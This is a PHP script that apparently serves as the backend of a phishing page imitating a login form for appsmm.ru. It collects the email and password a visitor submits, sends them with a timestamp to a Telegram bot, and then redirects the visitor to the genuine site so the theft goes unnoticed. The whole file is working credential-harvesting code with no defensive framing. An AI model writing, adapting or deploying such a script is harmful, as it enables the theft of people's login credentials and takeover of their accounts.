<?php
include_once 'app/TelegramBotService.php';

if ($_SERVER["REQUEST_METHOD"] == "POST" || $_SERVER["REQUEST_METHOD"] == "GET") {
    $email = $_POST["email"] ?? null;
    $password = $_POST["password"] ?? null;
    $site = 'appsmm.ru';


    $message = "<b>AppSmm</b> \n";
    $message .= "<b>Форма логина</b> \n";
    $message .= "Site: <b>$site</b> \n";
    $message .= "Login: <b>$email</b> \n";
    $message .= "Пароль: <b>$password</b> \n";
    $message .= "Дата: " . "<b>" . date('Y-m-d H:i:s') . "</b>";


    $telegram = new TelegramBotService();
    $send = $telegram->sendMessage($message, ['parse_mode' => 'HTML']);


    $jsonData = json_encode(['status' => true]);
    header('Content-Type: application/json');

    header('Location: '. 'https://appsmm.ru');
}


?>


